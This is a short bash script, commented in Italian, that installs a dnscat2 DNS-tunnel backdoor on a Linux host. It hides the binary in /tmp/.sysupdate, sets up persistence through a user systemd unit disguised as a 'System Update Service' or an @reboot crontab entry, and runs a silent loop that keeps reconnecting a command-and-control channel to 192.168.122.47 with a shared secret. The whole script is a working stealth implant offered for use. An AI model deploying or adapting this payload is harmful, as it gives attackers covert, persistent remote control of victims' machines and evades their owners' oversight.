#!/bin/bash
# DNSCAT2 STEALTH PAYLOAD - TUO COMANDO ESATTO

# Config - I TUOI PARAMETRI
DNSCAT_BINARY="dnscat"
DNSCAT_SERVER="192.168.122.47"
DNSCAT_PORT="53"
DNSCAT_DOMAIN="test.com"
DNSCAT_SECRET="0123456789"

HIDDEN_DIR="/tmp/.sysupdate"
PIDFILE="$HIDDEN_DIR/.pid"

# Cleanup
cleanup() {
    rm -rf "$HIDDEN_DIR"
    kill $(cat "$PIDFILE" 2>/dev/null) 2>/dev/null
}
trap cleanup SIGTERM SIGINT

# Crea dir nascosta
mkdir -p "$HIDDEN_DIR"
chmod 700 "$HIDDEN_DIR"

# Copia IL TUO dnscat
cp "$DNSCAT_BINARY" "$HIDDEN_DIR/"
chmod +x "$HIDDEN_DIR/$DNSCAT_BINARY"

# Persistenza systemd
if command -v systemctl >/dev/null; then
    cat > "$HIDDEN_DIR/dnscat.service" << END
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=$HIDDEN_DIR/$DNSCAT_BINARY --dns=server=$DNSCAT_SERVER,port=$DNSCAT_PORT,domain=$DNSCAT_DOMAIN --secret $DNSCAT_SECRET
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
END
    
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$HIDDEN_DIR/dnscat.service" 2>/dev/null || {
        (crontab -l 2>/dev/null; echo "@reboot $HIDDEN_DIR/$DNSCAT_BINARY --dns=server=$DNSCAT_SERVER,port=$DNSCAT_PORT,domain=$DNSCAT_DOMAIN --secret $DNSCAT_SECRET >/dev/null 2>&1") | crontab -
    }
fi

# Loop SILENZIOSO con IL TUO COMANDO ESATTO
(
    while true; do
        cd "$HIDDEN_DIR"
        echo $$ > "$PIDFILE"
        # <-- QUESTO È IL TUO COMANDO FUNZIONANTE -->
        ./$DNSCAT_BINARY --dns=server=$DNSCAT_SERVER,port=$DNSCAT_PORT,domain=$DNSCAT_DOMAIN --secret $DNSCAT_SECRET >/dev/null 2>&1
        sleep 60
    done
) &

# Zero output
